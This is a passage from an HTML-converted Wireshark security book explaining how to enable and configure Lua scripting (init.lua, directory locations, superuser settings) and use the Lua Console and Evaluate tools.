New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is run, Wireshark executes </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >init.lua</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >within the personal configuration directory. Once the personal </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >init.lua </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >script is finished running, any scripts passed in using the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-X</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section331" ><p class=MsoBodyText  style="margin-top:3.9500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >lua_script:script.lua </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command-line options are executed. This all happens before any packets have been handled. Within the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >init.lua </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >are </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dofile()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >functions that execute additional Lua scripts. We discuss </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dofile() </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >in more detail when you start learning how to build a dissector.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:13.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:0.0500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Windows Setup</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><a name="_bookmark621" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If your Windows version of Wireshark does not have Lua support, the quickest solution is to download the newest binary version from the Wireshark website. The newest versions have Lua by default, so they should work out of the box. You can always review </span><span><a href="#_bookmark56" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 2</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >for details on how to install Wireshark on Windows. As promised for Windows, the global directory that stores the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >init .lua</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.2000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >file is at the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >%programfiles%/Wireshark</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, or whatever directory you install Wireshark to. The personal configuration directory is located at</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >%AppData%/Wireshark</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Windows generally does not have a default file handler for </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >.lua </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >files, but they can be easily viewed or edited in Notepad.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:13.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Linux Setup</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The Linux setup procedure depends on the distribution you are using. We aren&#8217;t able to cover all the different setups here, so we describe common steps that need to be taken before you can start running Lua scripts.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As mentioned in </span><span><a href="#_bookmark198" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 3</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, it is not always a good idea to run Wireshark with root privileges due to security concerns. Because of this, the Wireshark developers disabled running Lua scripts as root altogether. This means that depending on your installation and setup, you need to check two settings in the Lua configuration file. This file is located in </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >/etc/wireshark/init.lua </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >by default. Open this file in your favorite editor and check the following two variables: </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >disable_lua</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >run_user_scripts_when_superuser</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. They are both located near the beginning of the file. To enable Lua support in Wireshark, the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >disable_lua </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >setting needs to be set to </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >false</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. For the script line </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >run_user_scripts_when_superuser</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, change the setting between </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >true</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >or</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section332" ><p class=MsoBodyText  style="margin-top:4.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >false</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, according to your situation. The top of the configuration</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >file should look like</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >this:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:114.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- Set disable_lua to true to disable Lua</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.0000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >support. disable_lua =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1500pt;font-size:12.0000pt;" >&nbsp;</span><b><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:12.0000pt;" >false</span></b><b><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:12.0000pt;" ><o:p></o:p></span></b></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><b><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></b></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:338.2000pt;margin-left:36.7500pt;text-indent:-28.8000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if disable_lua then return</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- If set and we are running with special privileges this setting</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- tells whether scripts other than this one are to be run. run_user_scripts_when_superuser = </span><b><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:12.0000pt;" >true</span></b><b><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:12.0000pt;" ><o:p></o:p></span></b></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><b><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></b></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><b><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></b></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:52.5000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- <a name="_bookmark622" ></a>disable potentialy harmful lua functions when running superuser</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if </span><b><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:12.0000pt;" >false </span></b><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local hint = "has been disabled due to running Wireshark as superuser. See</span><span><a href="http://wiki.wireshark.org/CaptureSetup/CapturePrivileges" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&nbsp;http://wiki.wireshark.org/CaptureSetup/CapturePrivileges</span></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:80.1500pt;margin-left:36.7500pt;text-indent:-28.8000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for help in running Wireshark as an unprivileged</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.2500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >user." local disabled_lib = {} setmetatable(disabled_lib,{</span><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;text-decoration:underline;text-underline:single;font-size:12.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;text-decoration:underline;text-underline:single;font-size:12.0000pt;" >&#9;</span></u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >index =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.4000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >error("this package ".. hint) end } );</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:16.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark623" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Tools" ></a>Tools</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If your </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >init.lua</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is configured correctly and Lua has loaded, within the Wireshark UI under the Tools dropdown menu you should have the Lua menu item. Within this menu are options for Console, Evaluate, Manual, and Wiki, as shown in<a name="_bookmark624" ></a>&nbsp;</span><span><a href="#_bookmark625" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-3</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section333" ><p class=MsoBodyText ><img width="780"  height="539"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker416769.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark625" ></a><span><a href="#_bookmark624" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-3:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Lua in Tools menu</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Choosing the Console option opens a Console window that shows output from your Lua scripts (see<a name="_bookmark626" ></a>&nbsp;</span><span><a href="#_bookmark627" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-4</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). This is helpful for troubleshooting when you use the Wireshark GUI.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section334" ><p class=MsoBodyText ><img width="780"  height="539"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker417044.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark627" ></a><span><a href="#_bookmark626" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-4:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Lua Console in Wireshark</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:11.1500pt;" ><a name="_bookmark628" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The Evaluate option is also handy for troubleshooting and debugging. It is basically a simplistic interactive shell similar to what we used in the &#8220;Lua Basics&#8221; section. You can type Lua code, and when you click Evaluate, it evaluates the code. What makes the Evaluate window special is that the Wireshark variables and libraries are loaded, unlike the regular Lua interactive shell, which has only the built-in standard library available. To demonstrate this, you can reference </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >USER_DIR</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, the variable that defines the personal configuration directory.<a name="_bookmark629" ></a>&nbsp;</span><span><a href="#_bookmark630" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-5</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows the Lua code needed to create another text window that will display the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >USER_DIR </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >variable. In case the print is difficult to read and you want to duplicate the same in your Lua console, this is the same code evaluated:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section335" ><p class=MsoBodyText ><img width="779"  height="475"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker417937.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark630" ></a><span><a href="#_bookmark629" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-5:</span></u></b><b><span 